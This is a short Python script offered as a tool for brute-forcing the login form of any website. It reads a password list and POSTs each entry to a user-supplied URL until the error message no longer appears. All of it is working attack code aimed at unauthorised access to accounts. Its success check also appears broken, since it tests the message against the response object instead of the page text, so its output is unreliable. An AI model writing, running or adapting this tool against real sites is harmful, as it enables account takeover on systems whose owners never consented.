

#!/bin/python3

import requests
from termcolor import colored
import sys

def bruteforce(username,url,inputusername,inputpassword,inputsubmit,errormsg,inputsubmitvalue):
    for password in passwords:
        password=password.strip()
        print(colored("[!] Tring to BruteForce with password "+password,'blue'))
        data_dictionary = {inputusername:username,inputpassword:password,inputsubmit:inputsubmitvalue}

        response=requests.post(url,data=data_dictionary)
       # response=str(response.content)
        if errormsg in response:
            pass
        else:
            print(colored("[+] User_name ==> "+username,'green'))
            print(colored("[+] Password  ==> "+password,'green'))
            sys.exit()
print(colored('''          *********************************************************
          *                                                       *
          *         BruteForcing Login form of any website        *
          *                                                       *
          ********************************************************* ''','yellow'))
try:
    page_url=input("Enter the URL for example:http://192.168.43.24/index.php :")
    inputname=input("Enter the name of the firstinput like username or name :")
    inputpassword=input("Enter the name of the secondinput like password or passwrd :")
    inputsubmit=input("Enter the name of the submit value like submit :")
    inputsubmitvalue=input("Enter the input Submit value name :")
    errormsg=input("Enter the Error message :")
    username=input("Enter the User name  : ")
    file1=input("Enter the file path of list of passwords :")
    with open(file1,"r") as passwords:
            bruteforce(username,page_url,inputname,inputpassword,inputsubmit,errormsg,inputsubmitvalue)
except KeyboardInterrupt:
    print(colored("\nPressed ctrl c forced exit",'red'))
except FileNotFoundError:
    print(colored("File not Found",'red'))
print(colored("[---]Login Failure ==> Password not found",'red'))
